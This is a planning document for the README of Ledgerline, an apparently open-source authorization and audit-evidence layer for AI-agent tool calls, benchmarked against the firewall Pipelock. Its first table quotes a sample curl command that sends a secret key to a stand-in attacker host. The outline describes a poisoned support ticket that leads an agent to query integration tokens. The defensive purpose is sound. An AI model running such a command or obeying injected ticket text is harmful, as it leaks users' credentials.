# README blueprint (for the Phase 14 open-source launch)

*Written 2026-10-03 after a full read of Pipelock's README. **Don't write the public README until Phase 14**: by then the features, numbers and screenshots it describes will exist. Re-check every competitor claim first (`docs/prior-art.md`).*

## 1. What makes Pipelock's README work

| Technique | How Pipelock does it | Use it? |
|---|---|---|
| One-line category + link | "Open-source AI agent firewall for Verifiable Egress Control" | **Yes.** Ours: "Open-source authorization and evidence layer for AI-agent actions" |
| Centred logo + badges | CI, security, OpenSSF Scorecard and Best Practices, coverage, licence, release, Discord | Yes, with honest badges only (CI, Scorecard, coverage, licence, release, PyPI) |
| Anchor nav bar | Problem · Verify · Quick Start · Action · Catches · Features · Architecture · Docs · Playground | Yes |
| Problem as one concrete attack | `curl "https://evil.com/steal?key=$KEY"`: "game over, unless…" | Yes: the poisoned support ticket asking for `integration_tokens`, or the silent rug pull |
| **"Verify it yourself"** right after the problem | Two commands produce signed receipts and verify them offline | **Yes.** `ledgerline demo` + `ledgerline verify --offline`, then "open the Lab" |
| Demo GIF near the top | A live exfiltration being blocked | Yes: **side-by-side Lab run** (unprotected leaks, protected blocks) |
| Multiple install paths | Source, binary, Docker, Homebrew, Helm | pip/uv, Docker Compose, (later) Helm |
| Results from a public benchmark | agent-egress-bench, live results page | Yes: AgentDojo + MCPTox numbers from Phase 11, reproducible |
| **Honest-assessment callouts** | "Balanced mode raises the bar… does not prove…" | **Yes, always**: state limits next to claims |
| Comparison table + OWASP coverage in `<details>` | Matrix vs scanners, sandboxes, kernel agents; ASI01–ASI10 coverage | Yes: see §4; OWASP MCP Top 10 + ASI + ATLAS |
| Features grouped by job | Detection, MCP, Containment, Evidence, Fleet, Operability | Yes, grouped by our pillars (§3) |
| Architecture as **SVG + text fallback** in `<details>` | `how-it-works.svg` plus an ASCII diagram for terminals | **Yes, for every diagram** |
| Screenshots of every UI view | Dashboard pages with descriptive alt text | Yes: Lab, ledger tamper demo, policy studio, approval inbox, Merkle viewer |
| Config, integrations, deployment, CI snippets | YAML, guides, Docker/K8s, GitHub Action | Yes |
| Project structure, testing table, credits, licence | Coverage gate, adversarial suite, supply chain | Yes |
| Tiers (Free/Pro/Enterprise) | Open-core with ELv2 and paid dashboard | **No.** Ledgerline is fully Apache-2.0, and we say so |

## 2. Planned README outline

1. **Header**: logo SVG, tagline, badges, nav, "Try the Lab" link (hosted demo, UI-33).
2. **The problem**: one concrete attack (poisoned ticket → `select * from integration_tokens`), and why model-level guardrails can't be the last line (adaptive attacks; Nasr et al.).
3. **What Ledgerline does, in one picture**: architecture SVG (§5, D1) and five verbs: *intercept · decide · pause · record · prove*.
4. **Verify it yourself**: `ledgerline demo` → `ledgerline verify --offline bundle.json` → `ledgerline ui`. No account, no network.
5. **See it in action**: the Lab GIF (side by side) and screenshots: Lab, tamper demo, policy studio, approval inbox, Merkle viewer, delegation graph.
6. **Quick start**: `uv tool install ledgerline` / Docker Compose; pin a server; run a host through the proxy; open the UI.
7. **What it stops (measured)**: scenario × outcome table (unprotected vs protected), with AgentDojo/MCPTox results and an **honest assessment** box (what it doesn't stop, e.g. egress DLP, which Pipelock covers).
8. **How it's different**: the comparison table (§4) and a "use it with…" paragraph.
9. **Features** by pillar (§3).
10. **How it works**: architecture, request lifecycle, evidence pipeline, delegation lineage SVGs (§5), each with a text fallback.
11. **Policy**: a Cedar example (permit tickets, forbid secrets after taint unless approved) and `ledgerline policy test`.
12. **Evidence model**: the event schema, hash chain → Merkle log → signed, witnessed checkpoints; spec link and conformance vectors.
13. **Integrations**: Claude Code, Cursor and other MCP hosts; agentgateway/Envoy ext-authz; OTel; A2A.
14. **Deployment**: local, Docker Compose, Kubernetes; security notes (localhost + token, OIDC).
15. **OWASP / ATLAS coverage** (`<details>`): MCP01–MCP10, ASI01–ASI10, ATLAS techniques, each Strong/Partial/None with a gap note.
16. **Testing and assurance**: test counts, Hypothesis fuzzing, scenario regression suite, tamper tests, cross-language verifiers, supply chain (Sigstore, SBOM, SLSA, Scorecard).
17. **Roadmap and status**, **Docs**, **Project structure**, **Contributing**, **Security policy**, **Credits** (deep-dive research, Tessera, Cedar, MCP SDK, Pipelock and others as prior art), **Licence** (Apache-2.0, all of it).

## 3. Feature pillars (README "What it does")

| Pillar | Contents |
|---|---|
| **Tool supply chain** | Whole-definition pinning (RFC 8785), hide changed/unpinned tools, verify before every call, human review, Agent Card pinning |
| **Authorization** | Cedar policies on tool + arguments, session taint, allow/deny/needs-approval, fail-closed defaults, policy tests in CI, what-if evaluator |
| **Human oversight** | Durable approvals (crash-proof, timeout = deny), evidence-first approval inbox |
| **Evidence** | Write-before-forward ledger, hash chain, keyed argument digests + erasable raw args, decision provenance (engine, bundle hash, matched rule, input digest), Merkle transparency log, signed checkpoints, external witnesses, offline bundles, independent verifiers (Python, TypeScript, Go builds the log) |
| **Lineage** | `on_behalf_of_chain`, MCP ↔ A2A joins, OAuth `act` claims, identity-loss detection, delegation graph |
| **Protocol hardening** | Strict JSON-RPC (duplicates, NaN, batches, size), header/body consistency, `Origin`/`Host` checks |
| **UI** | Attack Simulation Lab (side by side, defence toggles, coverage heatmap), ledger explorer + tamper demo, policy studio, approval inbox, live monitor, Merkle visualizer, delegation graph, benchmark dashboard, challenge mode |
| **Fits your stack** | Standalone proxy (stdio/HTTP) or ext-authz sidecar for agentgateway/Envoy; OTel spans; open schema mapped to IETF agent-audit-trail, Agent Receipts, OTel GenAI |

## 4. How Ledgerline is different: draft comparison

**Positioning line:** *Pipelock and similar firewalls decide whether traffic looks dangerous. Ledgerline decides whether an action is **authorized**, makes a person sign off on risky ones, and leaves **evidence anyone can verify**, in a format that works with whatever gateway you already run.*

| | **Ledgerline** | **Pipelock** | Gateways (agentgateway, ContextForge, Docker MCP GW) | MCP scanners (MCP-Scan/Snyk, mcp-context-protector) | Guardrails (Llama Guard, Lakera…) | Receipt formats (Agent Receipts, IETF draft) |
|---|---|---|---|---|---|---|
| Core job | **Authorization + evidence** for agent actions | Egress firewall + containment + receipts | Routing, auth, RBAC | Tool-definition scanning, pinning | Text classification | Specs only |
| Decision style | **Deterministic, analysable policy language (Cedar)**, testable in CI | Pattern/heuristic scanners + 30 built-in tool rules | CEL/RBAC on routes and tools | Heuristic + pinning | Probabilistic | — |
| Argument-level rules authored by you | ✅ (P5) | ⚠️ built-in rule set | ⚠️ (ToolHive Cedar `arg_*`) | ❌ | ❌ | — |
| Rug-pull protection | ✅ whole-definition pin, verify every call | ✅ mid-session detection | ❌ | ✅ (TOFU pinning) | ❌ | — |
| Egress DLP, injection scanning, SSRF, containment | ❌ **use Pipelock** | ✅ core strength | ⚠️ guardrail webhooks | ❌ | ✅ text only | — |
| Durable human approval (crash-proof, timeout = deny) | ✅ (P6, Temporal) | ⚠️ HITL modes (terminal) | ❌ | ❌ | ❌ | — |
| Decision provenance in record | ✅ engine, bundle hash, **matched rule, input digest, approver** | ⚠️ verdict + policy hash | ❌ | ❌ | ❌ | ⚠️ partial fields |
| Tamper-evident log | ✅ hash chain | ✅ hash chain | ❌ | ❌ | ❌ | ✅ (spec) |
| **Own Merkle transparency log, inclusion/consistency proofs, witness cosigning** | ✅ (P9, Tessera) | ⚠️ anchors checkpoints to Rekor | ❌ | ❌ | ❌ | ⚠️ optional (IETF) |
| Independent verifiers | ✅ Python + TypeScript (+ Go-built log) | ✅ Go, TS, Rust, Python | ❌ | ❌ | ❌ | — |
| **Delegation graph across MCP ↔ A2A** | ✅ (P10) | ⚠️ actor identity + A2A inspection | ⚠️ A2A routing | ❌ | ❌ | ⚠️ delegation field |
| Plugs into existing gateways | ✅ ext-authz sidecar (P12) | Is the mediator itself | Is the gateway | Wrapper/proxy | Webhook | — |
| **Side-by-side attack lab (unprotected vs protected)** | ✅ (P3) | ⚠️ playground shows protected run only | ❌ | ❌ | ⚠️ Gandalf (prompt-level) | — |
| UI licence | **Apache-2.0, all features** | Evidence viewer free; dashboard **Pro/Enterprise** | Varies | — | Commercial (most) | — |
| Runtime | Python (+ React UI, Go log service) | **Single Go binary** | Rust/Python/Go | Python | Hosted/models | — |

**Honest notes to keep in the README:**
- Pipelock is more mature and far broader on *egress*: DLP, injection scanning, containment, kill switch, single binary. Say so, and recommend running both. Pipelock guards the network boundary; Ledgerline authorizes actions and keeps the evidence.
- Hash chains, signatures and cross-language verifiers are **not** our novelty (Pipelock, Agent Receipts, Aileron). Our novelty is the *combination*: analysable policy with full decision provenance, durable approval, a witnessed Merkle log, delegation lineage, gateway neutrality, and a fully open UI.
- Never claim "first". Never claim "secure"; say "under these benchmarks".
- Re-verify every ✅/⚠️ for competitors on launch day; they move fast.

## 5. Diagrams to produce (hand-crafted SVG, light + dark, with text fallbacks)

| ID | Diagram | Shows |
|---|---|---|
| D1 | **Architecture** | Host → Ledgerline (transport, chain: pin → taint → policy → approval → ledger) → server; tlogd + witness; UI; OTel |
| D2 | **Request lifecycle** | One `tools/call`: parse → pin verify → policy (matched rule) → approval → write-before-forward → forward → outcome entry |
| D3 | **Attack, side by side** | The same poisoned-ticket attack: left leaks, right blocked at the policy step |
| D4 | **Evidence pipeline** | Entry → hash chain → Merkle tree → signed checkpoint → witness cosign → offline bundle → verifier |
| D5 | **Delegation lineage** | User → agent A → agent B → tool, with identity loss flagged |
| D6 | **Where Ledgerline fits** | Alongside a gateway (ext-authz) and an egress firewall (Pipelock), with guardrails as a signal |
| D7 | **Pillars map** | Eight pillars with phase badges (for the roadmap section) |

**SVG rules:** `viewBox`-based (crisp at any size); `prefers-color-scheme` styles inside the SVG, or `<picture>` with separate light/dark files; system font stack; meaningful `<title>`/`<desc>` and README alt text; under ~60 KB each; generated from source (e.g. a `docs/assets/diagrams/*.py` builder like the guide's, or hand-edited and linted) so they stay current.

## 6. Assets checklist for launch

- [ ] Logo + lockup SVG (light/dark)
- [ ] Lab GIF (≤ 8 MB, ~20 s): side-by-side silent rug pull, then poisoned-ticket theft
- [ ] Screenshots: Lab, coverage heatmap, ledger tamper demo, policy studio, approval inbox, Merkle viewer, delegation graph, benchmark dashboard
- [ ] D1–D7 SVGs + text fallbacks
- [ ] Benchmark table from the Phase 11 report; latency table from Phase 12
- [ ] OWASP MCP / ASI / ATLAS coverage table with gap notes
- [ ] Hosted read-only Lab (UI-33) link
- [ ] Badges: CI, OpenSSF Scorecard, Best Practices, coverage, PyPI, licence
